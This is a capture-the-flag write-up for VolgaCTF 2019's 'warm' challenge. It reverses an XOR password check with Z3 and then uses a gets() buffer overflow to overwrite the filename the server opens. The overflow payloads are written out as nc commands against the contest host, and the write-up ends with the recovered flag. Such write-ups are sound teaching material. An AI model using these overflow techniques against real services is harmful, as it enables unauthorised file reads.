# warm
pwn

## Challenge 

How fast can you sove it? nc warm.q.2019.volgactf.ru 443

[warm](warm)

## Solution

Decompiled. We notice sub_788() handles the input text.

We know length is 15 or less

	if (strlen(*(r7 + 0x4)) <= 0xf) {

And we need to fulfil the following if-statements
	
	if (((((((((zero_extend_32(*(int8_t *)(r7 + 0xf) ^ *(int8_t *)*(r7 + 0x4)) == 0x55) && (zero_extend_32(*(int8_t *)(*(r7 + 0x4) + 0x1) ^ *(int8_t *)*(r7 + 0x4)) == 0x4e)) && (zero_extend_32(*(int8_t *)(*(r7 + 0x4) + 0x2) ^ *(int8_t *)(*(r7 + 0x4) + 0x1)) == 0x1e)) && (zero_extend_32(*(int8_t *)(*(r7 + 0x4) + 0x3) ^ *(int8_t *)(*(r7 + 0x4) + 0x2)) == 0x15)) && (zero_extend_32(*(int8_t *)(*(r7 + 0x4) + 0x4) ^ *(int8_t *)(*(r7 + 0x4) + 0x3)) == 0x5e)) && (zero_extend_32(*(int8_t *)(*(r7 + 0x4) + 0x5) ^ *(int8_t *)(*(r7 + 0x4) + 0x4)) == 0x1c)) && (zero_extend_32(*(int8_t *)(*(r7 + 0x4) + 0x6) ^ *(int8_t *)(*(r7 + 0x4) + 0x5)) == 0x21)) && (zero_extend_32(*(int8_t *)(*(r7 + 0x4) + 0x7) ^ *(int8_t *)(*(r7 + 0x4) + 0x6)) == 0x1)) && (zero_extend_32(*(int8_t *)(*(r7 + 0x4) + 0x8) ^ *(int8_t *)(*(r7 + 0x4) + 0x7)) == 0x34)) {
	if (zero_extend_32(*(int8_t *)(*(r7 + 0x4) + 0x9) ^ *(int8_t *)(*(r7 + 0x4) + 0x8)) == 0x7) {
	if (zero_extend_32(*(int8_t *)(*(r7 + 0x4) + 0xa) ^ *(int8_t *)(*(r7 + 0x4) + 0x9)) == 0x35) {
	if (zero_extend_32(*(int8_t *)(*(r7 + 0x4) + 0xb) ^ *(int8_t *)(*(r7 + 0x4) + 0xa)) == 0x11) {
	if (zero_extend_32(*(int8_t *)(*(r7 + 0x4) + 0xc) ^ *(int8_t *)(*(r7 + 0x4) + 0xb)) == 0x37) {
	if (zero_extend_32(*(int8_t *)(*(r7 + 0x4) + 0xd) ^ *(int8_t *)(*(r7 + 0x4) + 0xc)) == 0x3c) {
	if (zero_extend_32(*(int8_t *)(*(r7 + 0x4) + 0xe) ^ *(int8_t *)(*(r7 + 0x4) + 0xd)) == 0x72) {
	if (zero_extend_32(*(int8_t *)(*(r7 + 0x4) + 0xf) ^ *(int8_t *)(*(r7 + 0x4) + 0xe)) == 0x47) {

Simplify

    // array = input_from_user;
    variable = 0x23;

    if ((((((((((variable ^ array) == 0x55) && 
        ((array[0x1] ^ array) == 0x4e)) && 
        ((array[0x2] ^ array[0x1]) == 0x1e)) && 
        ((array[0x3] ^ array[0x2]) == 0x15)) && 
        ((array[0x4] ^ array[0x3]) == 0x5e)) && 
        ((array[0x5] ^ array[0x4]) == 0x1c)) && 
        ((array[0x6] ^ array[0x5]) == 0x21)) && 
        ((array[0x7] ^ array[0x6]) == 0x1)) && 
        ((array[0x8] ^ array[0x7]) == 0x34)) {
    
    if ((array[0x9] ^ array[0x8]) == 0x7) {
    if ((array[0xa] ^ array[0x9]) == 0x35) {
    if ((array[0xb] ^ array[0xa]) == 0x11) {
    if ((array[0xc] ^ array[0xb]) == 0x37) {
    if ((array[0xd] ^ array[0xc]) == 0x3c) {
    if ((array[0xe] ^ array[0xd]) == 0x72) {
    if ((array[0xf] ^ array[0xe]) == 0x47) {

Solve using Z3

	$ python3 /Users/manzelseet/Downloads/z3-4.8.0.99339798ee98-x64-osx-10.11.6/solve.py 
	array__1 at 0x1 = 56
	array__2 at 0x2 = 38
	array__0 at 0x0 = 118
	array__11 at 0xb = 70
	array__12 at 0xc = 113
	array__8 at 0x8 = 101
	array__6 at 0x6 = 80
	array__4 at 0x4 = 109
	array__14 at 0xe = 63
	array__5 at 0x5 = 113
	array__13 at 0xd = 77
	array__15 at 0xf = 120
	array__10 at 0xa = 87
	array__9 at 0x9 = 98
	array__3 at 0x3 = 51
	array__7 at 0x7 = 81
	flag = v8&3mqPQebWFqM?x
	flag (hex) = 763826336d71505165625746714d3f78

And we can use the payload

	v8&3mqPQebWFqM?x

Put to server

	$ nc warm.q.2019.volgactf.ru 443
	Hi there! I've been waiting for your password!
	test
	Incorrect! Try again!

	Hi there! I've been waiting for your password!
	v8&3mqPQebWFqM?x
	Seek file with something more sacred!

---

Now, there is a second part to this

Inside the main function...

	int sub_9ec(int arg0, int arg1) {
		//... setup buffer ...
	    do {
	            do {
	                    sub_8f0(r7 + 0x78);
	                    puts("linux-armhf.so.3" + 0xa24);
	                    gets(r7 + 0x14);
	                    if (sub_788(r7 + 0x14) == 0x0) {
	                        break;
	                    }
	                    sub_978(0x1, 0x0);
	            } while (true);
	            *(r7 + 0xc) = fopen(r7 + 0x78, 0xbb0);
	            if (*(r7 + 0xc) != 0x0) {
	                break;
	            }
	            sub_978(0x2, r7 + 0x78);
	    } while (true);
	    //... prints out txt file ...
	    return r0;
	}

Notice that gets() is used. We can override the filename to be read

	# python -c 'from pwn import *; print "v8&3mqPQebWFqM?x" + cyclic(100)' | nc warm.q.2019.volgactf.ru 443
	Hi there! I've been waiting for your password!
	Unable to open vaaawaaaxaaayaaa file!
	Hi there! I've been waiting for your password!
	^C

	# pwn cyclic -l vaaa            
	84

Try out

	# python -c 'from pwn import *; print "v8&3mqPQebWFqM?x" + cyclic(84) + "flag.txt"' | nc warm.q.2019.volgactf.ru 443
	Hi there! I've been waiting for your password!
	Unable to open flag.txt file!

Works but we need to guess filename

	# python -c 'from pwn import *; print "v8&3mqPQebWFqM?x" + cyclic(84) + "./flag"' | nc warm.q.2019.volgactf.ru 443
	Hi there! I've been waiting for your password!
	Seek file with something more sacred!
	
	# python -c 'from pwn import *; print "v8&3mqPQebWFqM?x" + cyclic(84) + "sacred"' | nc warm.q.2019.volgactf.ru 443
	Hi there! I've been waiting for your password!
	VolgaCTF{1_h0pe_ur_wARM_up_a_1ittle}


Less guessing please... Filename is sacred `-.-`

## Flag

	VolgaCTF{1_h0pe_ur_wARM_up_a_1ittle}
